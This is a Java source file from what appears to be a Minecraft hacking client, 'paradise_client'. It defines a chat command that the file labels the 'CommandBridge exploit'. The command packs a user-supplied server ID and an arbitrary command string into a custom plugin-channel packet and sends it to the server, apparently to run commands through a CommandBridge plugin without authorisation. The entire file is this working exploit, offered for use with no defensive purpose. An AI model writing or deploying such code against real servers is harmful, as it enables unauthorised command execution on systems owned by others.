package net.paradise_client.command.impl;

import com.mojang.brigadier.arguments.ArgumentType;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.builder.RequiredArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import net.paradise_client.Helper;
import net.minecraft.command.CommandSource;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import net.minecraft.client.MinecraftClient;
import net.paradise_client.command.Command;
import net.paradise_client.packet.CommandBridgePacket;

public class CommandBridge extends Command {
    public CommandBridge(MinecraftClient minecraftClient) {
        super("cmdbri", "CommandBridge exploit", minecraftClient);
    }

    @Override
    public LiteralArgumentBuilder<CommandSource> build() {
        return (CommandBridge.literal(this.getName()).executes(this::incomplete)).then((CommandBridge.argument("serverID", StringArgumentType.string()).executes(this::incomplete)).then(CommandBridge.argument("command", StringArgumentType.greedyString()).executes(this::sendPayload)));
    }

    private int sendPayload(CommandContext<?> context) {
        Helper.sendPacket(new CustomPayloadC2SPacket(new CommandBridgePacket(context.getArgument("command", String.class), context.getArgument("serverID", String.class))));
        Helper.printChatMessage("Payload sent!");
        return 1;
    }

    private int incomplete(CommandContext<?> context) {
        Helper.printChatMessage("Incomplete command!");
        return 1;
    }
}
